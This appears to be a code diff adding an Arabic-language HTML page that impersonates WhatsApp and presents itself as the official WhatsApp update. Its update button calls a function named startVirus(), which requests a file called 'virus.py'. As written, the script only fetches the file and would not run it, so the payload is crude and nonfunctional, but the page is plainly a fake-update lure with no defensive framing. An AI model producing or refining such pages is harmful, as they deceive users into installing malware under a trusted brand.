@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>واتساب</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+    }
+   .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+   .header {
+      background-color: #25d366;
+      padding: 10px;
+      text-align: center;
+    }
+   .header img {
+      width: 100px;
+      height: 100px;
+      margin: 10px auto;
+    }
+   .main {
+      padding: 20px;
+      text-align: center;
+    }
+   .btn {
+      background-color: #25d366;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+   .btn:hover {
+      background-color: #1a9641;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="whatsapp-logo.png" alt="واتساب">
+    </div>
+    <div class="main">
+      <h1>واتساب</h1>
+      <p>هذا هو تحديث واتساب الرسمي</p>
+      <button class="btn" onclick="startVirus()">تحديث واتساب</button>
+    </div>
+  </div>
+  <script>
+    function startVirus() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "virus.py", true);
+      xhr.send();
+    }
+  </script>
+</body>
+</html>
